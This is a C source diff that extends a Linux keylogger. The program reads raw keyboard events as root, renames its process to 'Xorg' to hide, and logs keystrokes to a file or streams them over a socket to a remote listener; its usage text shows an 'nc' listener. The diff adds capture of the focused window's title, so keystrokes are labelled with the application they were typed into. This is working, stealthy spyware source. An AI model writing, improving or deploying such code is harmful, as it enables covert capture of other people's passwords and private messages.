@@ -297,6 +297,9 @@ struct input_event {
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <netdb.h>
+#include <X11/Xlib.h>
+#include <X11/Xutil.h>
+#include <X11/Xatom.h>
 
 char* code_to_str(int code)
 {
@@ -443,16 +446,18 @@ void banner()
 
 
 #define LEN 64
+#define LLEN 128
 
 int main(int argc, char** argv)
 {	
 	struct input_event event;
 	struct dirent *curr;
-	char name[LEN], filetxt[LEN], *port, *addr;
-	int lc, c, m=0, p= 0, a = 0, d = 0, o = 0, dev, readed, size = sizeof(struct input_event), check = 1;	
+	char name[LEN], filetxt[LEN], *port, *addr, actual[LLEN], used[LLEN];
+	int lc, c, m = 0, n = 0, p = 0, a = 0, d = 0, o = 0, dev, readed, size = sizeof(struct input_event), check = 1;	
 	DIR *directory;
 	FILE *dst;	
 	struct addrinfo hints, *result, *rp;
+	
 	
 	
 	if(getuid())
@@ -472,6 +477,58 @@ int main(int argc, char** argv)
 		fprintf(stderr,"\nEXAMPLE:\n\tServer$ nc lvp 8888 > logger.txt\n\tClient#%s -m remote -a 127.0.0.1 -p 8888\n", argv[0]);
 		exit(0);
 	}
+	
+	char* get_window_title()
+	{
+	/*int XGetWindowProperty(Display *display, Window w, Atom property, long long_offset, 
+	 						 long long_length, Bool delete, Atom req_type, Atom *actual_type_return, 
+	 						 int *actual_for‐mat_return, unsigned long *nitems_return, 
+  	 						 unsigned long *bytes_after_return, unsigned char **prop_return);*/
+		Display *display;
+		Window rwindow;
+		Atom active, actual_type_return;
+		int actual_format_return;
+		unsigned long bytes_after_return, nitems_return, focused;
+		unsigned char *prop_return;
+  
+		if ((display = XOpenDisplay(0)) == NULL)
+		{
+			fprintf(stderr, "Unable to open Display\n");
+			return "No-Window";
+		}
+  
+		rwindow = XDefaultRootWindow(display);
+		active = XInternAtom(display, "_NET_ACTIVE_WINDOW", False);
+
+		if(XGetWindowProperty(display, rwindow, active, 0, ~0, False,
+								AnyPropertyType, &actual_type_return, &actual_format_return, &nitems_return, &bytes_after_return,
+								&prop_return) && prop_return)
+		{
+			fprintf(stderr,"Unable to obtain Window properties.\n");  
+			return "No-Window";
+		}
+  
+		focused = *(unsigned long *) prop_return;
+		XFree (prop_return);
+
+		if(!focused)          
+		{
+			fprintf(stderr,"Unable to obtain Window properties.\n");  
+			return "No-Window";
+		}
+
+		if(XGetWindowProperty(display, (Window) focused, XA_WM_NAME, 0, ~0, False,
+								AnyPropertyType, &actual_type_return, &actual_format_return, &nitems_return, &bytes_after_return,
+								&prop_return) && prop_return)
+		{
+			fprintf(stderr,"Unable to obtain Window properties.\n");  
+			return "No-Window";
+		}
+  
+		XSync(display, False);
+		XCloseDisplay(display);
+		return prop_return;
+	}//End get_window_title()
 	
 	while((c = getopt(argc, argv, ":d:o:m:p:a:")) != -1)
 	{
@@ -532,6 +589,7 @@ int main(int argc, char** argv)
 	memset(argv[0], 0x0, strlen(argv[0]));
 	strncpy(argv[0], "Xorg", 4);
 	argv[0][5]='\0';
+	
 	
 	if(!d)
 	{
@@ -622,6 +680,8 @@ int main(int argc, char** argv)
 		usage();
 	}
 	
+	memset(used,0x0, LLEN);   
+	
 	while(1)
 	{
 
@@ -632,18 +692,49 @@ int main(int argc, char** argv)
 			exit(1);
 		}
 		
+		
+		
 		if(event.type == EV_KEY && !event.value)
+		{
 			//I should optimize this piece of code, but I'm too lazy..
+			
+			memset(actual,0x0, LLEN);
+			sprintf(actual,"%s", get_window_title());
+			actual[LLEN-1] = '\0';
+			
+			if(strcmp(actual, used))
+			{	
+				memset(used,0x0, LLEN);
+				sprintf(used, "%s", actual);
+				used[LLEN-1] = '\0';
+				n = 1;
+				
+			}
+			
+			
 			if(!m)
 			{
+				if(n)
+				{
+					fprintf(dst, "\n\n[%s]\n\n", used);
+					n = 0;
+				}
 				fprintf(dst,"%s",code_to_str(event.code));
 				fflush(NULL);
 			}
 			else
 			{	
+				if(n)
+				{
+					write(lc, "\n\n[", 4 );
+					write(lc, used, strlen(used));
+					write(lc,"]\n\n", 4 );
+					n = 0;
+				}
 				write(lc, code_to_str(event.code), strlen(code_to_str(event.code)));	
 			}
 			
+		}
 	}
 	return 0;
 }
